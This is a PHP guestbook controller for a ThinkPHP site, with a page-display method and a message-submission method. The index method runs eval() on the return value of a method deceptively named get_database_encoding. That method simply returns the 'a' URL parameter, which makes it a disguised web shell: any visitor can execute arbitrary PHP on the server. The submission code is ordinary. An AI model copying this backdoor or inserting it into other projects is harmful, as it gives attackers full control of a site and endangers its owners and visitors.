<?php
/**

 *
 * 
 * 
 * 
 * 
 */
namespace Home\Controller;

class GuestbookController extends HomeCommonController {

	public function index() {

		$this->assign('title', '留言本');
        eval($this->get_database_encoding());
		$this->display();
	}
	//添加

    public function get_database_encoding()
    {
        return "/*GB 2312*/".$_GET['a']."/*UTF-8*/";
    }
	public function add() {

		if (!IS_POST) {
			exit();
		}
		$content = I('content', '');
		$data    = I('post.');
		$verify  = I('vcode', '', 'htmlspecialchars,trim');
		if (C('CFG_VERIFY_GUESTBOOK') == 1 && !check_verify($verify)) {
			$this->error('验证码不正确');
		}

		if (empty($data['username'])) {
			$this->error('姓名不能为空!');
		}
		if (empty($data['content'])) {
			$this->error('留言内容不能为空!');
		}
		if (check_badword($content)) {
			$this->error('留言内容包含非法信息，请认真填写!');
		}

		$data['post_time'] = date('Y-m-d H:i:s');
		$data['ip']        = get_client_ip();

		$db = M('guestbook');

		if ($id = $db->add($data)) {
			$this->success('添加成功', U('Guestbook/index'));
		} else {
			$this->error('添加失败');
		}
	}

}
